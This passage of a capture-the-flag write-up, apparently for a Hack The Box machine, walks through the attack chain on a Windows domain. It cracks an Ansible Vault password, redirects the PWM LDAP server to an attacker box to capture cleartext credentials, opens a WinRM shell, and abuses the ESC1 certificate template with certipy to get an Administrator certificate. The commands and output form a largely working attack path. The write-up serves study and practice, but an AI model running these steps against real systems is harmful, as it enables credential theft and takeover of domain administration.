admin_login.yml:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8 ❯ ansible2john variable.yml \u0026gt; vault_hash Cracking the generated hash using JTR, gives the decryption password for the vault, !@#$%^\u0026amp;*.\n❯ john vault_hash --wordlist=~/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 128/128 AVX 4x]) Cost 1 (iteration count) is 10000 for all loaded hashes Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status !@#$%^\u0026amp;* (variable.yml) 1g 0:00:00:28 DONE (2023-08-05 02:30) 0.03567g/s 1420p/s 1420c/s 1420C/s 001983..victor2 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. With the password the variables can be decrypted the variables using ansible-vault decrypt command.\npwm_admin_login → svc_pwm pwm_admin_password → pWm_@dm!N_!23 ldap_admin_password → DevT3st@123 ❯ ansible-vault decrypt pwm_login.yml Vault password: Decryption successful ❯ cat pwm_login.yml svc_pwm ❯ ansible-vault decrypt pwm_password.yml Vault password: Decryption successful ❯ cat pwm_password.yml pWm_@dm!N_!23 ❯ ansible-vault decrypt ldap_password.yml Vault password: Decryption successful ❯ cat ldap_password.yml DevT3st@123 port 8443 - HTTPS #Based on the headers, it appears the site is loading the contents of the /pwm directory.\n❯ https --verify false authority.htb:8443 HTTP/1.1 200 Connection: keep-alive Content-Length: 82 Content-Type: text/html;charset=ISO-8859-1 Date: Sat, 05 Aug 2023 21:24:16 GMT Keep-Alive: timeout=60 \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;meta http-equiv=\u0026#34;refresh\u0026#34; content=\u0026#34;0;URL=\u0026#39;/pwm\u0026#39;\u0026#34;/\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;/html\u0026gt; The index page pops up a notice stating that PWM is in configuration mode, allowing me to make updates to the config w/o LDAP authentication.\nPWM Notice Attempting to authenticate using the admin credentials for PWM, decrypted from the ansible-vault, results in a \u0026ldquo;5017 Directory unavailable\u0026rdquo; error.\nPWN Login error Initial Foothold # Capturing LDAP credentials #The login page also links to a configuration manager at private/config/login. This is intriguing, considering the notice earlier regarding configuration modifications.\nConfiguration Manager Login Luckily, the pwm_admin_password credential from the ansible vault works here. Post login I can see the absolute path to the configuration file. It also has an option to import and export the configurations. When attempting to download the config a warning is shown stating the file contains sensitive credentials.\nFortunately, the pwm_admin_password obtained from the Ansible vault works here. Post login, I can see the absolute path to the configuration file, along with an option to \u0026ldquo;Import\u0026rdquo; and \u0026ldquo;Export\u0026rdquo; configurations\nConfiguration Manager The downloaded configuration file reveals\nLDAP proxy username: svc_ldap. LDAP proxy password, although it appears to be encrypted. LDAP server URL: ldaps://authority.authority.htb:636. ...snip... \u0026lt;setting key=\u0026#34;ldap.proxy.username\u0026#34; modifyTime=\u0026#34;2022-08-11T01:46:23Z\u0026#34; profile=\u0026#34;default\u0026#34; syntax=\u0026#34;STRING\u0026#34; syntaxVersion=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;label\u0026gt;LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Proxy User\u0026lt;/label\u0026gt; \u0026lt;value\u0026gt;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb\u0026lt;/value\u0026gt; \u0026lt;/setting\u0026gt; ...snip... \u0026lt;setting key=\u0026#34;ldap.proxy.password\u0026#34; modifyTime=\u0026#34;2022-08-11T01:46:23Z\u0026#34; profile=\u0026#34;default\u0026#34; syntax=\u0026#34;PASSWORD\u0026#34; syntaxVersion=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;label\u0026gt;LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Proxy Password\u0026lt;/label\u0026gt; \u0026lt;value\u0026gt;ENC-PW:SWHyEvLQo/B2gjYvXoL2OtcBIwVhfTW9spltsPbJeH/gQhfS+3/aIhmt29qR/LzkTYfsZfkLaNHbjGfbQldz5EW7BqPxGqzMz+bEfyPIvA8=\u0026lt;/value\u0026gt; \u0026lt;/setting\u0026gt; ...snip... \u0026lt;setting key=\u0026#34;ldap.serverUrls\u0026#34; modifyTime=\u0026#34;2022-08-11T01:46:23Z\u0026#34; profile=\u0026#34;default\u0026#34; syntax=\u0026#34;STRING_ARRAY\u0026#34; syntaxVersion=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;label\u0026gt;LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP URLs\u0026lt;/label\u0026gt; \u0026lt;value\u0026gt;ldaps://authority.authority.htb:636\u0026lt;/value\u0026gt; \u0026lt;/setting\u0026gt; ...snip... With the ability to import configurations on the website, altering the LDAP server URL to my own (hosted using responder) might allow me to capture LDAP credentials when other services attempt to authenticate to LDAP.\nI modified the LDAP server URL to ldap://\u0026lt;tun0\u0026gt;:IP, redirecting it to my attack box.\n...snip... \u0026lt;setting key=\u0026#34;ldap.serverUrls\u0026#34; modifyTime=\u0026#34;2022-08-11T01:46:23Z\u0026#34; profile=\u0026#34;default\u0026#34; syntax=\u0026#34;STRING_ARRAY\u0026#34; syntaxVersion=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;label\u0026gt;LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP URLs\u0026lt;/label\u0026gt; \u0026lt;value\u0026gt;ldap://10.10.14.132:389\u0026lt;/value\u0026gt; \u0026lt;/setting\u0026gt; ...snip... When I update the configuration and run Responder on my attack box, it successfully captures the cleartext LDAP credentials.\n❯ _ responder -I tun0 -v ...snip... LDAP server [ON] ...snip... [+] Listening for events... [LDAP] Attempting to parse an old simple Bind request. [LDAP] Cleartext Client : 10.10.11.222 [LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb [LDAP] Cleartext Password : lDaP_1n_th3_cle4r! This works even when starting a netcat listener on port 389 (ldap)\n❯ nc -nlvp 389 listening on [any] 389 ... connect to [10.10.14.132] from (UNKNOWN) [10.10.11.222] 59434 0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb�lDaP_1n_th3_cle4r! Shell as svc_ldap #With these new credentials, I have read access to the Department Shares share. However, the shares only has empty directories in it. Using the newly acquired credentials, I have read access to the Department Shares share. However, after spidering, it seems the share only contains empty directories.\n❯ nxc smb 10.10.11.222 -u \u0026#39;svc_ldap\u0026#39; -p \u0026#39;lDaP_1n_th3_cle4r!\u0026#39; SMB 10.10.11.222 445 AUTHORITY [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) SMB 10.10.11.222 445 AUTHORITY [+] authority.htb\\svc_ldap:lDaP_1n_th3_cle4r! ❯ nxc smb 10.10.11.222 -u \u0026#39;svc_ldap\u0026#39; -p \u0026#39;lDaP_1n_th3_cle4r!\u0026#39; --shares SMB 10.10.11.222 445 AUTHORITY [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) SMB 10.10.11.222 445 AUTHORITY [+] authority.htb\\svc_ldap:lDaP_1n_th3_cle4r! SMB 10.10.11.222 445 AUTHORITY [*] Enumerated shares SMB 10.10.11.222 445 AUTHORITY Share Permissions Remark SMB 10.10.11.222 445 AUTHORITY ----- ----------- ------ SMB 10.10.11.222 445 AUTHORITY ADMIN$ Remote Admin SMB 10.10.11.222 445 AUTHORITY C$ Default share SMB 10.10.11.222 445 AUTHORITY Department Shares READ SMB 10.10.11.222 445 AUTHORITY Development READ SMB 10.10.11.222 445 AUTHORITY IPC$ READ Remote IPC SMB 10.10.11.222 445 AUTHORITY NETLOGON READ Logon server share SMB 10.10.11.222 445 AUTHORITY SYSVOL READ Logon server share ❯ nxc smb 10.10.11.222 -u \u0026#39;svc_ldap\u0026#39; -p \u0026#39;lDaP_1n_th3_cle4r!\u0026#39; -M spider_plus -o DOWNLOAD_FLAG=true SMB 10.10.11.222 445 AUTHORITY [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) SMB 10.10.11.222 445 AUTHORITY [+] authority.htb\\svc_ldap:lDaP_1n_th3_cle4r! SPIDER_P... 10.10.11.222 445 AUTHORITY [*] Started module spidering_plus with the following options: SPIDER_P... 10.10.11.222 445 AUTHORITY [*] DOWNLOAD_FLAG: True ...snip... ...snip... SPIDER_P... 10.10.11.222 445 AUTHORITY [+] All files processed successfully. ❯ /bin/cat /tmp/nxc_spider_plus/ 10.10.11.222.json | jq -r \u0026#39;.\u0026#34;Department Shares\u0026#34;\u0026#39; {} The obtained credentials also provide access over WinRM. I successfully logged in as svc_ldap using evil-winrm.\n❯ nxc winrm 10.10.11.222 -u \u0026#39;svc_ldap\u0026#39; -p \u0026#39;lDaP_1n_th3_cle4r!\u0026#39; WINRM 10.10.11.222 5985 AUTHORITY [*] Windows 10.0 Build 17763 (name:AUTHORITY) (domain:authority.htb) WINRM 10.10.11.222 5985 AUTHORITY [+] authority.htb\\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!) ❯ evil-winrm -i 10.10.11.222 -u \u0026#39;svc_ldap\u0026#39; -p \u0026#39;lDaP_1n_th3_cle4r!\u0026#39; Evil-WinRM shell v3.5 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc_ldap\\Documents\u0026gt; whoami htb\\svc_ldap *Evil-WinRM* PS C:\\Users\\svc_ldap\\Documents\u0026gt; Enumerating Active Directory # In the C:\\ directory, there\u0026rsquo;s a \u0026ldquo;Certs\u0026rdquo; directory containing a certificate named LDAPs.pfx.\n*Evil-WinRM* PS C:\\\u0026gt; ls Directory: C:\\ Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 4/23/2023 6:16 PM Certs d----- 3/28/2023 1:59 PM Department Shares d----- 3/17/2023 9:20 AM Development d----- 8/9/2022 7:00 PM inetpub d----- 3/24/2023 8:22 PM PerfLogs d-r--- 3/25/2023 1:20 AM Program Files d----- 3/25/2023 1:19 AM Program Files (x86) d----- 8/5/2023 7:23 PM pwm d-r--- 3/24/2023 11:27 PM Users d----- 7/12/2023 1:19 PM Windows -a---- 8/10/2022 8:44 PM 84784749 pwm-onejar-2.0.3.jar *Evil-WinRM* PS C:\\\u0026gt; ls \u0026#34;C:/Certs/\u0026#34; Directory: C:\\Certs Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 4/23/2023 6:11 PM 4933 LDAPs.pfx The certificate is password protected. Nevertheless, its presence alone suggests the existence of Active Directory Certificate Services (AD CS).\n❯ certipy cert -pfx LDAPs.pfx Certipy v4.7.0 - by Oliver Lyak (ly4k) [-] Got error: Invalid password or PKCS12 data [-] Use -debug to print a stacktrace A Certutil dump confirms the presence of a certificate authority named AUTHORITY-CA in the environment.\n*Evil-WinRM* PS C:\\Users\\svc_ldap\\Documents\u0026gt; certutil -dump Entry 0: (Local) Name: \u0026#34;AUTHORITY-CA\u0026#34; Organizational Unit: \u0026#34;\u0026#34; Organization: \u0026#34;\u0026#34; Locality: \u0026#34;\u0026#34; State: \u0026#34;\u0026#34; Country/region: \u0026#34;\u0026#34; Config: \u0026#34;authority.authority.htb\\AUTHORITY-CA\u0026#34; Exchange Certificate: \u0026#34;\u0026#34; Signature Certificate: \u0026#34;authority.authority.htb_AUTHORITY-CA.crt\u0026#34; Description: \u0026#34;\u0026#34; Server: \u0026#34;authority.authority.htb\u0026#34; Authority: \u0026#34;AUTHORITY-CA\u0026#34; Sanitized Name: \u0026#34;AUTHORITY-CA\u0026#34; Short Name: \u0026#34;AUTHORITY-CA\u0026#34; Sanitized Short Name: \u0026#34;AUTHORITY-CA\u0026#34; Flags: \u0026#34;13\u0026#34; Web Enrollment Servers: \u0026#34;\u0026#34; CertUtil: -dump command completed successfully Enum with adPEAS #Executed the adPEAS.ps1 script to perform additional enumeration in the AD environment.\nImport-Module .\\adPEAS.ps1 Invoke-adPEAS -Domain \u0026#39;authority.htb\u0026#39; -Outputfile adPEAS_outputfile -NoColor All members of the Authenticated Users group possess permissions to add computers to the authority.htb domain.\n[?] +++++ Checking Add-Computer Permissions +++++ [+] Filtering found identities that can add a computer object to domain \u0026#39;authority.htb\u0026#39;: [!] Every member of group \u0026#39;Authenticated Users\u0026#39; can add a computer to domain \u0026#39;authority.htb\u0026#39; distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=authority,DC=htb objectSid: S-1-5-11 memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=authority,DC=htb CN=Certificate Service DCOM Access,CN=Builtin,DC=authority,DC=htb CN=Users,CN=Builtin,DC=authority,DC=htb Looking at vulnerabilities in AD CS, it appears that the CorpVPN template is susceptible to the ECS1 vulnerability.\n[?] +++++ Checking Template \u0026#39;CorpVPN\u0026#39; +++++ [!] Template \u0026#39;CorpVPN\u0026#39; has Flag \u0026#39;ENROLLEE_SUPPLIES_SUBJECT\u0026#39; [+] Identity \u0026#39;HTB\\Domain Computers\u0026#39; has enrollment rights for template \u0026#39;CorpVPN\u0026#39; Template Name: CorpVPN Template distinguishedname: CN=CorpVPN,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=authority,DC=htb Date of Creation: 03/24/2023 23:48:09 [+] Extended Key Usage: Encrypting File System, Secure E-mail, Client Authentication, Document Signing, 1.3.6.1.5.5.8.2.2, IP Security User, KDC Authentication EnrollmentFlag: INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE [!] CertificateNameFlag: ENROLLEE_SUPPLIES_SUBJECT [+] Enrollment allowed for: HTB\\Domain Computers Privilege Escalation # AD CS Certificate abuse #❯ certipy find -vulnerable -stdout -u svc_ldap@authority.htb -p \u0026#39;lDaP_1n_th3_cle4r!\u0026#39; -dc-ip 10.129.216.215 Certipy v4.8.0 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 37 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 13 enabled certificate templates [*] Trying to get CA configuration for \u0026#39;AUTHORITY-CA\u0026#39; via CSRA [!] Got error while trying to get CA configuration for \u0026#39;AUTHORITY-CA\u0026#39; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error. [*] Trying to get CA configuration for \u0026#39;AUTHORITY-CA\u0026#39; via RRP [!] Failed to connect to remote registry. Service should be starting now. Trying again... [*] Got CA configuration for \u0026#39;AUTHORITY-CA\u0026#39; [*] Enumeration output: Certificate Authorities 0 CA Name : AUTHORITY-CA DNS Name : authority.authority.htb Certificate Subject : CN=AUTHORITY-CA, DC=authority, DC=htb Certificate Serial Number : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4 Certificate Validity Start : 2023-04-24 01:46:26+00:00 Certificate Validity End : 2123-04-24 01:56:25+00:00 Web Enrollment : Disabled User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Permissions Owner : AUTHORITY.HTB\\Administrators Access Rights ManageCertificates : AUTHORITY.HTB\\Administrators AUTHORITY.HTB\\Domain Admins AUTHORITY.HTB\\Enterprise Admins ManageCa : AUTHORITY.HTB\\Administrators AUTHORITY.HTB\\Domain Admins AUTHORITY.HTB\\Enterprise Admins Enroll : AUTHORITY.HTB\\Authenticated Users Certificate Templates 0 Template Name : CorpVPN Display Name : Corp VPN Certificate Authorities : AUTHORITY-CA Enabled : True Client Authentication : True Enrollment Agent : False Any Purpose : False Enrollee Supplies Subject : True Certificate Name Flag : EnrolleeSuppliesSubject Enrollment Flag : AutoEnrollmentCheckUserDsCertificate PublishToDs IncludeSymmetricAlgorithms Private Key Flag : ExportableKey Extended Key Usage : Encrypting File System Secure Email Client Authentication Document Signing IP security IKE intermediate IP security use KDC Authentication Requires Manager Approval : False Requires Key Archival : False Authorized Signatures Required : 0 Validity Period : 20 years Renewal Period : 6 weeks Minimum RSA Key Length : 2048 Permissions Enrollment Permissions Enrollment Rights : AUTHORITY.HTB\\Domain Computers AUTHORITY.HTB\\Domain Admins AUTHORITY.HTB\\Enterprise Admins Object Control Permissions Owner : AUTHORITY.HTB\\Administrator Write Owner Principals : AUTHORITY.HTB\\Domain Admins AUTHORITY.HTB\\Enterprise Admins AUTHORITY.HTB\\Administrator Write Dacl Principals : AUTHORITY.HTB\\Domain Admins AUTHORITY.HTB\\Enterprise Admins AUTHORITY.HTB\\Administrator Write Property Principals : AUTHORITY.HTB\\Domain Admins AUTHORITY.HTB\\Enterprise Admins AUTHORITY.HTB\\Administrator [!] Vulnerabilities ESC1 : \u0026#39;AUTHORITY.HTB\\\\Domain Computers\u0026#39; can enroll, enrollee supplies subject and template allows client authentication There\u0026rsquo;s also a python based tool, certipy which can be used to enumerate AD CS remotely.\nAccording to Certipy\u0026rsquo;s output:\nThe Enterprise CA is named AUTHORITY-CA. The DNS Hostname is authority.authority.htb. The Certificate Name Flag is configured as EnrolleeSuppliesSubject. Extended Key Usage contains Client Authentication, which means the generated certificate can be used to authenticate to computers in the AD. Manager approval is not required before issuing the cert. Authorized Signatures Required is set to zero. As a result, the CorpVPN template appears to be vulnerable to ESC1.\nThe same info can be obtained using Certify\u0026rsquo;s pre-compiled binary.\n*Evil-WinRM* PS C:\\Users\\svc_ldap\\Documents\u0026gt; .\\Certify.exe find /vulnerable ...snip... [*] Action: Find certificate templates [*] Using the search base \u0026#39;CN=Configuration,DC=authority,DC=htb\u0026#39; [*] Listing info about the Enterprise CA \u0026#39;AUTHORITY-CA\u0026#39; Enterprise CA Name : AUTHORITY-CA DNS Hostname : authority.authority.htb FullName : authority.authority.htb\\AUTHORITY-CA Flags : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED ...snip... [!] Vulnerable Certificates Templates : CA Name : authority.authority.htb\\AUTHORITY-CA Template Name : CorpVPN Schema Version : 2 Validity Period : 20 years Renewal Period : 6 weeks msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT ...snip... Permissions Enrollment Permissions Enrollment Rights : HTB\\Domain Admins S-1-5-21-622327497-3269355298-2248959698-512 HTB\\Domain Computers S-1-5-21-622327497-3269355298-2248959698-515 HTB\\Enterprise Admins S-1-5-21-622327497-3269355298-2248959698-519 Certify completed in 00:00:10.0047510 The ESC1 vulnerability, which involves a misconfigured certificate template, allows users with enrollment rights to specify a SAN ( subjectAltName ). The certificate name flag is associated with the construction of the subject name for an issued certificate. When set to EnrolleeSuppliesSubject, it signifies that the user initiating a new certificate request for the said template can specify the certificate for any other user. Exploiting this vulnerability would allow me to obtain certificates for other users, including Domain Admins.\nAccording to the enrolment permissions for the vulnerable certificate, aside from Domain Admins, members of the Domain Computers group also have enrolment rights. Domain Computers is a default AD group comprising of all computers in the domain. Enumeration with adPEAS indicated that any authenticated user can add a computer to the domain. Since, the svc_ldap user isn\u0026rsquo;t part of the group, exploiting the vulnerable certificate template requires joining the Domain Computers group.\n*Evil-WinRM* PS C:\\Users\\svc_ldap\\Documents\u0026gt; net group \u0026#39;Domain Computers\u0026#39; Group name Domain Computers Comment All workstations and servers joined to the domain Members ------------------------------------------------------------------------------- The command completed successfully. *Evil-WinRM* PS C:\\Users\\svc_ldap\\Documents\u0026gt; whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes =========================================== ================ ============ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group BUILTIN\\Certificate Service DCOM Access Alias S-1-5-32-574 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Plus Mandatory Level Label S-1-16-8448 The MachineAccountQuota is set to a value greater than 0. This implies that even unprivileged users have the ability to add computers to the domain.\n*Evil-WinRM* PS C:\\Users\\svc_ldap\\Documents\u0026gt; Get-ADDomain | Get-ADObject -Properties \u0026#39;ms-DS-MachineAccountQuota\u0026#39; ms-ds-machineaccountquota ------------------------- 10 The same information can be obtained remotely using bloodyAD.\n❯ bloodyAD -u \u0026#39;svc_ldap\u0026#39; -p \u0026#39;lDaP_1n_th3_cle4r!\u0026#39; -d authority.htb --host 10.10.11.222 get object \u0026#39;DC=authority,DC=htb\u0026#39; --attr ms-DS-MachineAccountQuota distinguishedName: DC=authority,DC=htb ms-DS-MachineAccountQuota: 10 Exploit Path #Based on the findings, I can get an Administrator certificate:\nAdd a new computer to the domain to gain access to the Domain Computers group. Authenticate to the newly added computer. Request a certificate for Administrator from the vulnerable template using the new computer. Utilize PassTheCert to authenticate as Administrator. Exploit explained The addcomputer.py script from Impacket can be to used to add a new computer account in the domain, using the credentials of a domain user. The input format is DOMAIN/username:password followed by the computer name and computer password.\n❯ addcomputer.py authority.htb/svc_ldap:\u0026#39;lDaP_1n_th3_cle4r!\u0026#39; -computer-name Abraxas -computer-pass Abraxas Impacket for Exegol - v0.10.1.dev1+20230806.34223.faf17b2 - Copyright 2022 Fortra - forked by ThePorgs [*] Successfully added machine account Abraxas$ with password Abraxas. This can be verified using the Get-ADComputer command. The computer Abraxas$ is present, but comparing it with the Authority$ computer, it lacks the DNSHostName attribute.\n*Evil-WinRM* PS C:\\Users\\svc_ldap\\Documents\u0026gt; Get-ADComputer Abraxas -properties dnshostname,serviceprincipalname DistinguishedName : CN=Abraxas,CN=Computers,DC=authority,DC=htb DNSHostName : Enabled : True Name : Abraxas ObjectClass : computer ObjectGUID : d7c3dfee-2cb5-4f28-8afc-38913a60b83d SamAccountName : Abraxas$ SID : S-1-5-21-622327497-3269355298-2248959698-11618 UserPrincipalName : *Evil-WinRM* PS C:\\Users\\svc_ldap\\Documents\u0026gt; Get-ADComputer Authority -properties dnshostname,serviceprincipalname DistinguishedName : CN=AUTHORITY,OU=Domain Controllers,DC=authority,DC=htb DNSHostName : authority.authority.htb Enabled : True Name : AUTHORITY ObjectClass : computer ObjectGUID : 23c88ddb-c76e-41bd-8b75-dd04e08431cc SamAccountName : AUTHORITY$ serviceprincipalname : {HOST/AUTHORITY/htb.corp, ldap/AUTHORITY/ForestDnsZones.authority.htb, GC/AUTHORITY/htb.corp, ldap/AUTHORITY/DomainDnsZones.authority.htb...} SID : S-1-5-21-622327497-3269355298-2248959698-1000 UserPrincipalName : The certify-ad or certify.exe tool can be employed to obtain a certificate as Administrator. Given that the newly added computer lacks the DNSHostname attribute, it needs to be specified explicitly when requesting a new certificate. Additionally, when specifying the username, it needs to be Abraxas$ because authenticated and domain-joined accounts have a $ sign appended to samAccountName.\nCertipy flags include:\n-target for specifying the target domain. -ca for indicating the Certificate Authority Name. -upn for specifying the target user, preferably a domain admin (Administrator). -dns for setting the DNS to authority.authority.htb (used solely for certificate request). -template for specifying the template to use (CorpVPN). Windows equivalent command -\u0026gt; certify.exe request /ca:\u0026lt;$certificateAuthorityHost\u0026gt; /template:\u0026lt;$vulnerableCertificateTemplateName\u0026gt; /altname:\u0026lt;$adUserToImpersonate\u0026gt;\n❯ certipy req \\ -u \u0026#39;Abraxas$\u0026#39; -p \u0026#39;Abraxas\u0026#39; \\ -ca \u0026#39;AUTHORITY-CA\u0026#39; -target authority.htb \\ -upn Administrator@authority.htb -dns authority.authority.htb -dc-ip 10.10.11.222 \\ -template CorpVPN Certipy v4.7.0 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [-] Got error: Unknown DCE RPC fault status code: 00000721 [-] Use -debug to print a stacktrace It seems that the commands encounter intermittent RPC errors, but the issue is resolved by retrying the command a few times. I\u0026rsquo;m not entirely sure about the exact reason for this.\n❯ certipy req \\ -u \u0026#39;Abraxas$\u0026#39; -p \u0026#39;Abraxas\u0026#39; \\ -ca \u0026#39;AUTHORITY-CA\u0026#39; -target authority.htb \\ -upn Administrator@authority.htb -dns authority.authority.htb -dc-ip 10.10.11.222 \\ -template CorpVPN Certipy v4.7.0 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [*] Successfully requested certificate [*] Request ID is 3 [*] Got certificate with multiple identifications UPN: \u0026#39;Administrator@authority.htb\u0026#39; DNS Host Name: \u0026#39;authority.authority.htb\u0026#39; [*] Certificate has no object SID [*] Saved certificate and private key to \u0026#39;administrator_authority.pfx\u0026#39; After running the command multiple times, I was able to get a certificate for Administrator.\n❯ certipy cert -pfx certipy/administrator_authority.pfx Certipy v4.7.0 - by Oliver Lyak (ly4k) -----BEGIN CERTIFICATE----- MIIGZDCCBUygAwIBAgITEwAAAANIw05iQpigHQAAAAAAAzANBgkqhkiG9w0BAQsF ADBHMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJYXV0aG9y ...snip... ...snip... -----BEGIN PRIVATE KEY----- MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQC3VxxDWy0NYcqv I6GJoU2qOnvyFMceyVihlIB6E73PVkA03Xhz0wB0t3IWXFUaS0ZaZAle0Q32QOcj \u0026lt;--SNIP--\u0026gt; \u0026lt;--SNIP--\u0026gt; Attempting authentication with the Administrator\u0026rsquo;s certificate results in a DC error: KDC has no support for padata type. This suggests that the KDC lacks configuration for Kerberos authentication with certificates or does not have the required Enhanced Key Usages (EKUs).\n❯ certipy auth -pfx administrator_authority.pfx Certipy v4.7.0 - by Oliver Lyak (ly4k) [*] Found multiple identifications in certificate [*] Please select one: [0] UPN: \u0026#39;Administrator@authority.htb\u0026#39; [1] DNS Host Name: \u0026#39;authority.authority.htb\u0026#39; \u0026gt; 0 [*] Using principal: administrator@authority.htb [*] Trying to get TGT... [-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type) Attempting to obtain the Administrator\u0026rsquo;s TGT with Rubeus results in a similar error.\n*Evil-WinRM* PS C:\\Users\\svc_ldap\\Documents\u0026gt; .\\Rubeus.exe asktgt /user:Administrator /certificate:administrator_authority.pfx /ptt ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.2.0 [*] Action: Ask TGT [*] Using PKINIT with etype rc4_hmac and subject: CN=Abraxas$ [*] Building AS-REQ (w/ PKINIT preauth) for: \u0026#39;authority.htb\\Administrator\u0026#39; [*] Using domain controller: fe80::8856:b0bf:b6f3:1fad%8:88 [X] KRB-ERROR (6) : KDC_ERR_C_PRINCIPAL_UNKNOWN *Evil-WinRM* PS C:\\Users\\svc_ldap\\Documents\u0026gt; I came across another blog mentioning CVE-2022-26923, which relied on RBCD. Despite bloodyAD indicating that Abraxas$ could impersonate Authority, I wasn\u0026rsquo;t able to get a ticket for impersonating Administrator. I\u0026rsquo;m not entirely certain about the reason for this, but I suspect it might be a false positive.\n❯ openssl pkcs12 -in administrator_authority.pfx -out administrator_authority.pem -nodes Enter Import Password: ❯ bloodyAD -s -u \u0026#39;Abraxas$\u0026#39; -d authority.htb -c \u0026#39;:administrator_authority.pem\u0026#39; --host 10.10.11.222 add rbcd \u0026#39;AUTHORITY$\u0026#39; \u0026#39;ABRAXAS$\u0026#39; [+] ABRAXAS$ can now impersonate users on AUTHORITY$ via S4U2Proxy ❯ _ rdate -n 10.10.11.222 Mon Aug 7 16:58:57 IST 2023 ❯ getST.py -spn ldap/authority.htb -impersonate Administrator -dc-ip 10.10.11.222 \u0026#39;authority.htb/Abraxas$:Abraxas\u0026#39; Impacket for Exegol - v0.10.1.dev1+20230806.34223.faf17b2 - Copyright 2022 Fortra - forked by ThePorgs [-] CCache file is not found. Skipping... [*] Getting TGT for user [*] Impersonating Administrator [*] Requesting S4U2self [*] Requesting S4U2Proxy [-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database) [-] Probably user Abraxas$ does not have constrained delegation permissions or impersonated user does not exist PassTheCert Attack #The remaining step involves attempting the PassTheCert attack, and I found an informative blog post here. It can be used to:\nElevate privileges, granting the user DCSync privileges. Modify the password for a certain user. Get a LDAP shell. With an admin certificate, I can also add an user to the domain admin group For this attack the certificate and the private keys need to be separate. Certipy\u0026rsquo;s cert sub-command makes this process straightforward.\n❯ certipy cert -pfx administrator_authority.pfx -nokey -out admin.crt Certipy v4.7.0 - by Oliver Lyak (ly4k) [*] Writing certificate and to \u0026#39;admin.crt\u0026#39; ❯ certipy cert -pfx administrator_authority.pfx -nocert -out admin.key Certipy v4.7.0 - by Oliver Lyak (ly4k) [*] Writing private key to \u0026#39;admin.key\u0026#39; Utilizing the Python script from AlmondOffSec, I was able to get an interactive LDAP shell. Given that the certificate belongs to Administrator, I can add the svc_ldap user to the Domain Admins group using the add_user_to_group command. Since this script uses Impacket under the hood, I can also add a new computer using the add_computer command within the script.\n❯ python passthecert.py -domain authority.htb -dc-ip 10.10.11.222 -crt certipy/admin.crt -key certipy/admin.key 